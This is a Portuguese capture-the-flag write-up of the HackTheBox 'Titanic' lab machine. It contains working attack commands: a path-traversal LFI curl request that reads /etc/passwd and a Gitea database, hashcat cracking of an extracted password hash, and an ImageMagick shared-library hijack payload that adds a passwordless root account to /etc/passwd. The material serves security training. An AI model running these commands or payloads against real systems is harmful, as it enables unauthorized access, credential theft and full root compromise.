#Difficult : Easy
#OS : Linux
***
## Enumeração de portas
Por padrão começamos a fazer a enumeração das portas abertas, para ter uma noção dos serviços rodando.

```
nmap 10.10.11.55 -Pn -sC -sV -A -oN nmap_output
```
![[Pasted image 20250327195253.png]]
Foi identificado duas portas.
`80` - HTTP | `22` - SSH

Ao acessa-lo no navegador somo redirecionados para `titanic.htb`, então vamos adiciona-lo em nosso `/etc/hosts`.
```sh
echo "10.0.11.15        titanic.htb" >> /etc/hosts
```

Ao acessar novamente, somos apresentados a um site.
![[Pasted image 20250327195924.png]]
***
## Enumeração de sub domínio
Embora tenhamos um site para explorar, podemos verificar se temos mais algum site disponível.
```sh
ffuf -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 20
```
![[Pasted image 20250327200125.png]]

Descobrimos um subdomínio `dev.titanic.htb`. Vamos adiciona-lo ao arquivo de hosts.
```sh
10.0.11.15        titanic.htb dev.titanic.htb
```

Vamos acessa-lo para ter uma noção do que temos.
![[Pasted image 20250327200432.png]]
Temos acesso ao ``Gitea``, um serviço de ``git`` sel-hosted. Vamos deixa-lo de lado por enquanto.
****
## LFI (Local File Inclusion)
Em `titanic.htb` podemos criar e baixar um ticket clicando em `Book Your Trip`.
![[Pasted image 20250327200903.png]]

Recebemos um arquivo ``JSON`` com as informações que inserimos.
![[Pasted image 20250327200930.png]]
![[Pasted image 20250327201656.png]]

Vamos interceptar as requisições. A primeira requisição manda nossos dados. 
![[Pasted image 20250327202226.png]]

Após a primeira requisição um requisição é enviada requisitando o arquivo.
![[Pasted image 20250327202424.png]]
O parâmetro `ticket` tem como valor um arquivo, então está sujeito a ``LFI``.

Podemos fazer um teste com o `curl`.
```sh
curl -X GET "http://titanic.htb/download?ticket=../../../../../../../etc/passwd"
```
![[Pasted image 20250327202914.png]]

Vendo a localização do `shell` e da `home` dos usuários, chego a conclusão que os únicos  usuários possíveis regulares são : `root` | `developer`.
***
## Cracking Gitea HASH
Embora tenha um ``LFI``, não achei nenhum arquivo interessante por enquanto. Podemos voltar ao `Gitea` e ver o que temos indo em ``Explore``.
![[Pasted image 20250327203615.png]]

Em `developer/docker-config/gitea/docker-compose.yml` , podemos ver as configurações que usaram para subir o contêiner do ``Gitea``.

```yml
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

Por padrão o banco de dados do `Gitea` fica armazenado em `/etc/gitea.db` junto como os outros arquivos de configuração. Seguindo essa lógica considerei que  `/home/developer/gitea/data/` representasse o `/etc`, então podemos então buscar por `/home/developer/gitea/data/gitea/gitea.db`.

```bash
curl -X GET "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db

file ./gitea.db
```
![[Pasted image 20250331144203.png]]

É um banco de dados em ``SQLite 3``, entre outros dados ele armazena os usuários e suas senhas criptografadas do ``GItea``. Procurando pela internet achei um [script](https://raw.githubusercontent.com/unix-ninja/hashcat/refs/heads/master/tools/gitea2hashcat.py) que converte do formato do ``Gitea`` para um formato em que podemos usar no ``hashcat``.

>[!tip] Post
>Separe um tempo para ler o [POST](https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes) sobre o desenvolvimento do Script, e de outro [Writeup](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash) do `0xdf` da máquina `Compiled`

Podemos primeiro enumerar quais usuários temos. Embora tenhamos alguns, sabemos que só existem no sistema o `root` e o `developer`.
```bash
sqlite3 ./gitea.db "select name,salt,passwd,passwd_hash_algo from user;"
```
![[Pasted image 20250331145501.png]]

Devemos então selecionar o `salt` e o `passwd` dos usuários que queremos, e passar como argumento para o ``script``.
```bash
sqlite3 ./gitea.db "SELECT salt,passwd FROM user WHERE name LIKE '%administrator%' OR name LIKE '%developer%';" | ../gitea2hashcat.py > hash.txt

cat hash.txt
```
![[Pasted image 20250331150244.png]]

podemos então quebrar a hash com o `hashcat`. E conseguimos quebrar a senha do usuário `developer`.
```bash
hashcat -m 10900 ./hash.txt ../rockyou.txt

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```
***
## PRIV ESC
Agora que temos a senha do usuário podemos fazer SSH na máquina. E tentar listar o que temos acesso.

Como vejo então que não podemos executar comandos de forma privilegiada. Então procuro por algum arquivo que seja interessante nas pastas `/tmp`, `/opt` e `/var`. Dentro de `/opt/scripts` há um script que pertence ao `root`, mas podemos tanto ler quanto executar o script.
![[Pasted image 20250331151210.png]]

```bash
cat /opt/scripts/identify_images.sh
```
```
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Após pesquisar um pouco sobre o `script` descubro que o binário `/usr/bin/magick` está em uma versão vulnerável.
```bash
/usr/bin/magick identify --version

Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```
![[Pasted image 20250331152112.png]]

>[!tip] CVE
>Separe um tempo para ler sobre está [CVE](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8).

Pelo o que eu entendi, podemos criar uma `shared library` no diretório em que vamos rodar o `ImageMagick` com nossa ``payload`` e o comando que queremos rodar.

Então rodei esse comando dentro da pasta `/opt/app/static/assets/images`, pois é onde o script roda.
```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("echo 'root4me::0:0:root4me:/root:/bin/bash' >> /etc/passwd");
    exit(0);
}
EOF
```
O comando `"echo 'root4me::0:0:root4me:/root:/bin/bash' >> /etc/passwd"` irá criar um usuário sem senha e com privilégios de `root`.

Após o `script` rodar, podemos verificar o arquivo `/etc/passwd` para ver se o usuário foi criado. e enfim logar com ele.
```bash
cat /etc/passwd
...
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
root4me::0:0:root4me:/root:/bin/bash
```

```bash
su root4me
```
![[Pasted image 20250331153425.png]]
**Owned!!!**
***

![[Pasted image 20250331153727.png]]



























